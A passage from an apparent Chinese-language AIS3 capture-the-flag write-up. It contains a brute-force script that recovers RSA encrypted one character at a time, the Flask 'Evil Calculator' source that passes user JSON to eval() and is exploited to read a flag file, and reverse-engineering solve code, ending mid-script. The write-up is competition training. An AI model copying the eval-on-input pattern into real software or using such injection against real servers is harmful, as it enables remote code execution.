42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830, 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324, 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269, 8855798603366167912634233401398286651752671525801140525178611090639905433230380535711326462952071294452556819384200831430822862220907470038589552641363759764881881084119960616686113091264272665290715332905431138686504873774368450566561688814993821800992967990682116846800657243011069696481920893909247794983, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940, 48345447683174081443502925378502329908064423944850311779861406407783604557812792515281621715817536127803162311234459315836524837064977025182379655213338205159741266326939713833052921255157742860610743189155260503439836583887313584730345974553768985184119012533854386867355018502198395672167297716386558437643, 2943509185067047938273565758747957807917637430462018374124947856251091022696853505230975399503014099411245162812979057344198094444949853114144790397928000334361276864689352349519363636219566973775714458213611238774130167222835759501223813455853370320854862131109567941072112035263351158877256955712543549605, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558]
+</span></span></code></pre></td></tr></table></div></div><p>反正就是他把明文的每一個字都做 RSA 加密了，我們只要暴力破解然後逆推回去就好</p><p>solve.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from Crypto.Util.number import *
+</span></span><span class=line><span class=cl>e,n=(64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cipher =[59582983136368434856816799733313446746433796034384724221174424464969737874802116129348607979328098841766335449896610931770063087921739964156335144291643702667891887833963756948394265219864837961748202920096128332905237576243643095664147826020400199347355043162641743846198725931842313977049712473768688780204, 95359547394031742813518330673269556403528254059894407470006786975603938062435320319282644182444182438612748874603359501010449113346386193598111715879103479311697744375488228536365895249959983701008182395138745363343749821348881488616739650767615867269542213617639437927373484681942750228038458670913761461906, 46329325300279098651694178842591774415260876326218182283454895682597312145324055490326488805186682301528705330448500034219715636964856131530973835780285303243952273742119154142469279746360304190118988650200422700136950019141246372634642054318988506247030406078971388938494583721698317950574261574174233878465, 99372516099607712778908802720080113062724120782160998443385643772511391370661101893707293382044546993124605549696368316348952556779713164710839853078160450782104255053788389238478472574549113909833434906535103012424826026640284958298083646000213492094244631381094489147645893989473799375006911204994971262513, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558, 12319813533472769541026063795801870849236715810997656653501875874806446093919930377755747066386074676697058702735112064576219731845584108035461434499628574742399407498867908576045220515065246483998134315307132901329833371485817530138131352593805641664023978795298886913968639954517583992930243922021434381738, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573, 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724, 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341, 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626, 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177, 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830, 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324, 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269, 8855798603366167912634233401398286651752671525801140525178611090639905433230380535711326462952071294452556819384200831430822862220907470038589552641363759764881881084119960616686113091264272665290715332905431138686504873774368450566561688814993821800992967990682116846800657243011069696481920893909247794983, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940, 48345447683174081443502925378502329908064423944850311779861406407783604557812792515281621715817536127803162311234459315836524837064977025182379655213338205159741266326939713833052921255157742860610743189155260503439836583887313584730345974553768985184119012533854386867355018502198395672167297716386558437643, 2943509185067047938273565758747957807917637430462018374124947856251091022696853505230975399503014099411245162812979057344198094444949853114144790397928000334361276864689352349519363636219566973775714458213611238774130167222835759501223813455853370320854862131109567941072112035263351158877256955712543549605, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag=&#39;&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for i in cipher:
+</span></span><span class=line><span class=cl>     for j in range(0,127):
+</span></span><span class=line><span class=cl>         if pow(j,e,n) == i:
+</span></span><span class=line><span class=cl>             flag+=chr(j)
+</span></span><span class=line><span class=cl>print(flag)
+</span></span></code></pre></td></tr></table></div></div><p>btw 這題跟 SCIST 2024 的 Final 的一題 Crypto 幾乎一模一樣xDD</p><p><a class=link href=https://hackmd.io/@toxicpie9/r1B-fa1p2 target=_blank rel=noopener>https://hackmd.io/@toxicpie9/r1B-fa1p2</a></p><p>Flag: AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}</p><h2 id=web>Web</h2><h3 id=evil-calculator>Evil Calculator</h3><p>source.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from flask import Flask, request, jsonify, render_template
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app = Flask(__name__)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/calculate&#39;, methods=[&#39;POST&#39;])
+</span></span><span class=line><span class=cl>def calculate():
+</span></span><span class=line><span class=cl>    data = request.json
+</span></span><span class=line><span class=cl>    expression = data[&#39;expression&#39;].replace(&#34; &#34;,&#34;&#34;).replace(&#34;_&#34;,&#34;&#34;)
+</span></span><span class=line><span class=cl>    try:
+</span></span><span class=line><span class=cl>        result = eval(expression)
+</span></span><span class=line><span class=cl>    except Exception as e:
+</span></span><span class=line><span class=cl>        result = str(e)
+</span></span><span class=line><span class=cl>    return jsonify(result=str(result))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route(&#39;/&#39;)
+</span></span><span class=line><span class=cl>def index():
+</span></span><span class=line><span class=cl>    return render_template(&#39;index.html&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>if __name__ == &#39;__main__&#39;:
+</span></span><span class=line><span class=cl>    app.run(&#34;0.0.0.0&#34;,5001)
+</span></span></code></pre></td></tr></table></div></div><p>看完 source 會發現我們可以用 POST 送 <code>"expression" : "payload"</code> 這樣有問題的 json 過去，至於為啥 payload 不用做修改是因為他用了 eval 這個邪惡ㄉ東西。
+(喔然後他會把空格跟_都替換掉= =)</p><p><img src=https://hackmd.io/_uploads/B1drnQeER.png loading=lazy alt=image></p><p>我們要做的就是讀 flag 這個檔案，利用 eval() 的特性我們可以直接讀</p><p>BTW 這題我第一次解的解法忘記ㄌ，是在寫 wp 的時候另外找到其他解</p><p>我一開始的解法上面會出現3個flag</p><p>flag: AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p><h2 id=reverse>Reverse</h2><h3 id=the-long-print>The Long Print</h3><p>發現一個程式會自動噴 flag 但是 sleep 的時間是 20000秒 ， 我們的目標是把它 patch到 1 秒</p><p><img src=https://hackmd.io/_uploads/HJEYLcbE0.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/Hyhvs7lVA.png loading=lazy alt=image>
+(這張圖少了?})</p><p>BTW 他最後執行完會跳掉，所以要注意他噴的東西。</p><p>flag:AIS3{You_are_the_master_of_time_management!!!!?}</p><p>火拳のエース</p><p>開 main 之後有一個 print_flag 先把時間 patch 掉</p><p><img src=https://hackmd.io/_uploads/SkcmedE40.png loading=lazy alt=image></p><p>patch 完之後回到 main 有一個 complex_function ， 然後叫 GPT 幫我把程式整理好</p><p>complex_function.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import sys
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def complex_function(param_1, param_2):
+</span></span><span class=line><span class=cl>    if 0x40 &lt; param_1 &lt; 0x5b:
+</span></span><span class=line><span class=cl>        local_10 = (param_1 - 0x41 + param_2 * 0x11) % 0x1a
+</span></span><span class=line><span class=cl>        iVar1 = param_2 % 3 + 3
+</span></span><span class=line><span class=cl>        param_2 = param_2 % 3
+</span></span><span class=line><span class=cl>        if param_2 == 2:
+</span></span><span class=line><span class=cl>            local_10 = (local_10 - iVar1 + 0x1a) % 0x1a
+</span></span><span class=line><span class=cl>        elif param_2 &lt; 3:
+</span></span><span class=line><span class=cl>            if param_2 == 0:
+</span></span><span class=line><span class=cl>                local_10 = (local_10 * iVar1 + 7) % 0x1a
+</span></span><span class=line><span class=cl>            elif param_2 == 1:
+</span></span><span class=line><span class=cl>                local_10 = (iVar1 * 2 + local_10) % 0x1a
+</span></span><span class=line><span class=cl>        return chr(local_10 + 0x41)
+</span></span><span class=line><span class=cl>    print(&#34;It feels slightly wrong, but almost correct...&#34;)
+</span></span><span class=line><span class=cl>    sys.exit(1)
+</span></span></code></pre></td></tr></table></div></div><p>再回來看 main</p><p><img src=https://hackmd.io/_uploads/HJiZHuVNA.png loading=lazy alt=image></p><p>我們的目標是拿到原本的 buffer0 buffer1 buffer2 buffer3，所以先用 complex_function 拿到我們要的被 xor 過後的 cipher，接著再利用 xor 的特性拿到 buffer 的原數值。</p><p>solve.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>import sys
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def complex_function(param_1, param_2):
+</span></span><span class=line><span class=cl>    if 0x40 &lt; param_1 &lt; 0x5b:
+</span></span><span class=line><span class=cl>        local_10 = (param_1 - 0x41 + param_2 * 0x11) % 0x1a
+</span></span><span class=line><span class=cl>        iVar1 = param_2 % 3 + 3
+</span></span><span class=line><span class=cl>        param_2 = param_2 % 3
+</span></span><span class=line><span class=cl>        if param_2 == 2:
+</span></span><span class=line><span class=cl>            local_10 = (local_10 - iVar1 + 0x1a) % 0x1a
+</span></span><span class=line><span class=cl>        elif param_2 &lt; 3:
+</span></span><span class=line><span class=cl>            if param_2 == 0:
+</span></span><span class=line><span class=cl>                local_10 = (local_10 * iVar1 + 7) % 0x1a
+</span></span><span class=line><span class=cl>            elif param_2 == 1:
+</span></span><span class=line><span class=cl>                local_10 = (iVar1 * 2 + local_10) % 0x1a
+</span></span><span class=line><span class=cl>        return chr(local_10 + 0x41)
+</span></span><span class=line><span class=cl>    print(&#34;It feels slightly wrong, but almost correct...&#34;)
